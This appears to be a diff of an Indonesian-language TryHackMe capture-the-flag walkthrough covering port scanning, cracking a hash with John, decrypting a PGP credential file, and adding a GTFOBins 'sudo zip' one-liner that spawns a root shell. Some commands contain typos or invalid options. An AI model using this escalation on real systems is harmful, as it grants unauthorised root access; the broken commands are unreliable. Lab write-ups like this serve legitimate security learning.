@@ -8,7 +8,11 @@ Oke langsung kita mulai
 sebelumnya agar memudahkan kita akan menyimpan ip kedalam variable
 
 IP=
+ kita cek apakah kita telah terhubung dengan taarget
 
+ whoping $target
+
+ 
 langkah pertama kita akan melakukan port scanning menggunakan Nmap untuk melihat port yang terbuka pada sistem tersebut 
 kita dapat melakukan scanning dengan perintah 
 
@@ -98,7 +102,7 @@ john --show hash
 yang kita lakukan selanjutnya adalah 
 mengimport kunci tryhackme.asc dan melakukan dekrpsi file credential.pgp
 
-pgp --impor tryhackme.asc
+gpg --impor tryhackme.asc
 gpg --dekripsi credential.pgp
 kita masukkan bisa masukkan passphrase dari hasi brute-force yang kita lakukan tadi
 
@@ -128,6 +132,10 @@ kita lihat kita bisa menjalankan binary zip sebagai root.
 kita cek melalui situs 
 https://gtfobins.github.io/gtfobins/zip/
 dan cari exploit-nya
+
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+sudo rm $TF
 
 
 kita coba eksploit
